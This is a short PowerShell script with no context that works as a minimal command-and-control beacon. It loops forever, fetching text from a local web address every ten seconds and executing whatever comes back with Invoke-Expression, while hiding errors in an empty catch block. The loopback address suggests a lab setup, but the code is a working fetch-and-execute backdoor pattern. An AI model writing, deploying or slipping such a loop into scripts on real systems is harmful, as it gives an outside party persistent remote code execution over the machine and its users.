while (\$true) {
    try {
        \$cmd = Invoke-WebRequest -Uri "http://127.0.0.1:8080/command" -UseBasicParsing
        Invoke-Expression \$cmd.Content
    } catch {}
    Start-Sleep -Seconds 10
}
